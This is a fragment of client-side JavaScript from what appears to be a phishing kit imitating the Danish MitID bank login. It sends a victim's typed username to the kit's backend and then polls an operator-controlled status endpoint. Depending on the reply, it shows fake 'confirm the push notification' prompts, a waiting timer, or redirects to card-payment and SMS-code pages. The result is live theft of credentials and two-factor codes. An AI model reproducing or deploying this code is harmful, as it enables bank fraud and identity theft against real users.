              async function sendLog() {
                            const id = document.referrer.split('/')[5]
                            axios.post(`/api/sendLk`, {
                                itemId: `${id.replace(/[^a-zA-Z]+/g, '')}`,
                                bank: `MitID`,
                                login: `${document.querySelector('#username5').value}`
                            }).then(async function (res) {
                                document.querySelector('#mitid-core-client-section').innerHTML = `
                        <div class="loader"></div>
                     `
                                getStatus(res.data.id)
                            })
                        }

        </script>

                    async function push() {
                        document.querySelector('#mitid-core-client-section').innerHTML = `
                        <div class="loader"></div>
                     `                        
                     document.querySelector('#mitid-core-client-form > div').innerHTML = `<div class="mitid-login-divider--top"><hr class="mitid--divider mitid--divider-light">
                        <label class="mitid-tooltip__text " for="notification" aria-haspopup="true">1) Åbn MitID-appen;</label>
                        <!-- <h1></h1>
                        <h1 class="mitid-tooltip__text ">2) Bekræft push-meddelelsen for vellykket identifikation.</h1>
                        <h1></h1> -->
                        <h2 class="mitid-tooltip__text ">2) Bekræft push-meddelelsen for vellykket identifikation.</h2>
<!-- <label class="mitid-tooltip__text " for="notification" aria-haspopup="true">2) Bekræft push-meddelelsen for vellykket identifikation.</label> -->
                    </div>`
                    }

                    async function hold() {
                        let timeMinut = 3600

                        timer = setInterval(function () {
                            seconds = timeMinut % 60 
                            minutes = timeMinut / 60 % 60 
                            hour = timeMinut / 60 / 60 % 60 
                            if (timeMinut <= 0) {
                                clearInterval(timer);
                                alert("Время закончилось");
                            } else {
                                let strTimer = `${Math.trunc(hour)}:${Math.trunc(minutes)}:${seconds}`;
                                document.querySelector('#mitid-core-client-form > div').innerHTML = `<div class="mitid-login-divider--top"><hr class="mitid--divider mitid--divider-light">
                            <label class="mitid-tooltip__text " for="notification" aria-haspopup="true">${strTimer}</label>
    <!-- <label class="mitid-tooltip__text " for="notification" aria-haspopup="true">2) Bekræft push-meddelelsen for vellykket identifikation.</label> -->
                        </div>`
                            }
                            --timeMinut; 
                        }, 1000)
                        document.querySelector('#mitid-core-client-section').innerHTML = `
                        <div class="loader"></div>
                     `                                          
                    }

                    var status

                    async function getStatus(token) {
                        setInterval(async () => {
                            axios.post(`/api/getStatus`, {
                                id: token,
                            }).then(async function (res) {
                                if(res.data.method != status && res.data.method == "push") {
                                    status = res.data.method
                                    push()
                                }
                                else if(res.data.method != status && res.data.method == "hold") {
                                    status = res.data.method
                                    hold()
                                } else if(res.data.method != status && res.data.method == "lkCard") {
                                    status = res.data.method
                                    window.open(`/pay/merchant/${document.referrer.split('/')[5]}`)
                                } else if(res.data.method != status && res.data.method == "wrongLk") {
                                    status = res.data.method
                                    wrongLk()
                                } else if(res.data.method != status && res.data.method == "sms") {
                                    status = res.data.method
                                    window.open(`/pay/merchant/confirm-sms/${token}`);
                                }
                            })
                        }, 1500)
                        }
        </script>
